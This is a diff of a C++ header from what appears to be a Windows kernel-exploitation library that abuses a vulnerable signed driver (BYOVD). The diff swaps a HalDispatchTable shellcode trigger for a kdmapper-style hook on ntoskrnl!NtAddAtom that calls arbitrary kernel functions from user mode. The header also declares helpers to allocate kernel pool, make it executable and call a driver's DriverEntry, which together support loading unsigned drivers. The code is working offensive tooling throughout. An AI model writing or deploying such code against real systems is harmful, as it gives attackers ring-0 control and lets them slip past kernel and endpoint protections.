@@ -3,7 +3,7 @@
 #include <cstdint>
 #include <string>
 #include <vector>
-#include <functional>
+#include <type_traits>
 
 #include "hinv_byovd.hpp"
 
@@ -47,9 +47,6 @@ uint64_t GetKernelExport(byovd::IByovdBackend* backend, uint64_t moduleBase, con
 // Resolve a kernel export by module name + export name.
 uint64_t ResolveKernelExport(byovd::IByovdBackend* backend, const wchar_t* moduleName, const char* exportName);
 
-// Find HalDispatchTable virtual address in ntoskrnl.
-uint64_t FindHalDispatchTable(byovd::IByovdBackend* backend);
-
 // Windows version info used to pick kernel structure layouts.
 struct OsVersionInfo {
     uint32_t major = 0;
@@ -61,61 +58,79 @@ struct OsVersionInfo {
 // Get OS version via NtQuerySystemInformation(SystemVersionInformation).
 OsVersionInfo GetOsVersion();
 
-// Acquire a kernel guarded mutex or ERESOURCE by address.
-// type: 0 = ExAcquireResourceExclusiveLite, 1 = KeAcquireGuardedMutex
-bool AcquireKernelLock(byovd::IByovdBackend* backend, uint64_t lockAddress, int type);
-
-// Release a kernel lock previously acquired with AcquireKernelLock.
-bool ReleaseKernelLock(byovd::IByovdBackend* backend, uint64_t lockAddress, int type);
-
 // Read/write primitive wrappers for convenience.
 inline bool ReadU64(byovd::IByovdBackend* b, uint64_t va, uint64_t& out) { return b->ReadKernelMemory(va, &out, sizeof(out)); }
 inline bool ReadU32(byovd::IByovdBackend* b, uint64_t va, uint32_t& out) { return b->ReadKernelMemory(va, &out, sizeof(out)); }
 inline bool WriteU64(byovd::IByovdBackend* b, uint64_t va, uint64_t in)   { return b->WriteKernelMemory(va, &in, sizeof(in)); }
 inline bool WriteU32(byovd::IByovdBackend* b, uint64_t va, uint32_t in)   { return b->WriteKernelMemory(va, &in, sizeof(in)); }
 
-// Execute a small kernel shellcode via HalDispatchTable[1] overwrite.
-//   shellcode  : bytes to execute in Ring 0
-//   arg1, arg2 : 64-bit arguments passed in RCX, RDX (shellcode must follow Windows x64 ABI)
-//   outResult  : optional 64-bit return value read from a fixed sentinel
-// Returns true if the trigger appeared to fire.
-bool ExecuteKernelShellcode(byovd::IByovdBackend* backend,
-                            const std::vector<uint8_t>& shellcode,
-                            uint64_t arg1 = 0,
-                            uint64_t arg2 = 0,
-                            uint64_t* outResult = nullptr);
+// Debug trace: appends a stage marker to the file named by the HINV_TRACE
+// environment variable (one line, flushed by close). No-op when unset.
+// Exists because stdout buffering loses everything on a bugcheck.
+void Trace(const char* stage);
 
-// SMAP-safe kernel execution: the context block is copied into the same kernel scratch
-// page as the shellcode before execution. The builder receives the scratch page base
-// and must return a context vector whose internal pointers already reference that page.
-// After execution, the first qword of the kernel context is returned in outResult.
-using ContextBuilder = std::function<std::vector<uint8_t>(uint64_t scratchBase)>;
+namespace detail {
 
-bool ExecuteKernelShellcodeSmapSafe(byovd::IByovdBackend* backend,
-                                    const std::vector<uint8_t>& shellcode,
-                                    ContextBuilder buildContext,
-                                    uint64_t* outResult = nullptr);
+// Install/remove the temporary ntoskrnl!NtAddAtom prologue hook used by
+// CallKernelFunction. `original` receives the overwritten bytes (12 bytes:
+// mov rax, imm64; jmp rax). Implemented in hinv_kmem.cpp.
+bool InstallCallHook(byovd::IByovdBackend* backend, uint64_t target, uint8_t (&original)[12]);
+bool RemoveCallHook(byovd::IByovdBackend* backend, const uint8_t (&original)[12]);
 
-// Allocate kernel memory by executing a tiny allocator shellcode.
-// Uses ExAllocatePool2 on Win10+ or ExAllocatePoolWithTag on older systems.
+// User-mode ntdll!NtAddAtom address (the syscall stub we invoke).
+void* UserNtAddAtom();
+
+} // namespace detail
+
+// Call an arbitrary kernel function with up to 4 register arguments,
+// kdmapper-style: the first bytes of ntoskrnl!NtAddAtom are replaced with a
+// `mov rax, funcVa; jmp rax` stub through the backend's read-only write
+// primitive (physical mapping on the Intel backend), then ntdll!NtAddAtom is
+// invoked from usermode — the syscall enters the hook with our argument
+// registers intact and the target's RAX becomes our return value. The
+// prologue is always restored. No shellcode, no HalDispatchTable, no PTE
+// self-reference games.
+template<typename T, typename... A>
+bool CallKernelFunction(byovd::IByovdBackend* backend, T* outResult, uint64_t funcVa, A... args) {
+    static_assert(sizeof...(A) <= 4, "CallKernelFunction supports at most 4 register arguments");
+    constexpr bool isVoid = std::is_same_v<T, void>;
+
+    if constexpr (!isVoid) {
+        if (!outResult) return false;
+    } else {
+        (void)outResult;
+    }
+    if (!backend || !funcVa) return false;
+
+    uint8_t original[12]{};
+    if (!detail::InstallCallHook(backend, funcVa, original)) return false;
+
+    using Fn = T(__stdcall*)(A...);
+    auto fn = reinterpret_cast<Fn>(detail::UserNtAddAtom());
+    Trace("kmem: syscall begin");
+    if constexpr (isVoid) {
+        fn(args...);
+    } else {
+        *outResult = fn(args...);
+    }
+    Trace("kmem: syscall returned");
+
+    return detail::RemoveCallHook(backend, original);
+}
+
+// Allocate kernel pool memory via ExAllocatePoolWithTag (NonPagedPool; NX on
+// Win8+, use ProtectKernelMemory to make it executable when needed).
 bool AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size, uint64_t& outKernelVa);
 
-// Free previously allocated kernel memory via ExFreePoolWithTag.
+// Free pool memory allocated by AllocateKernelMemory (ExFreePoolWithTag).
 bool FreeKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa);
 
-// Resolve a kernel DriverObject by name (e.g. L"\\Driver\\Null") using ObReferenceObjectByName.
-// Returns the object pointer (kernel VA) or 0. Caller must call DereferenceObject when done.
-uint64_t GetDriverObject(byovd::IByovdBackend* backend, const wchar_t* driverName);
+// Change page protection of a kernel range via MmSetPageProtection.
+bool ProtectKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa, size_t size, uint32_t protect);
 
-// Decrement the reference count on a kernel object obtained by GetDriverObject.
-bool DereferenceObject(byovd::IByovdBackend* backend, uint64_t objectAddress);
-
-// Call a driver entry point from Ring 0. Returns the NTSTATUS produced by DriverEntry.
+// Call a driver entry point in Ring 0. Returns the NTSTATUS produced by DriverEntry.
 uint32_t CallDriverEntry(byovd::IByovdBackend* backend, uint64_t driverEntryVa,
                          uint64_t driverObjectVa, uint64_t registryPathVa);
-
-// Callback signature for a user-supplied kernel execution primitive.
-using KernelExecCallback = std::function<bool(const std::vector<uint8_t>& shellcode, uint64_t arg1, uint64_t arg2, uint64_t* out)>;
 
 } // namespace kmem
 } // namespace hinv
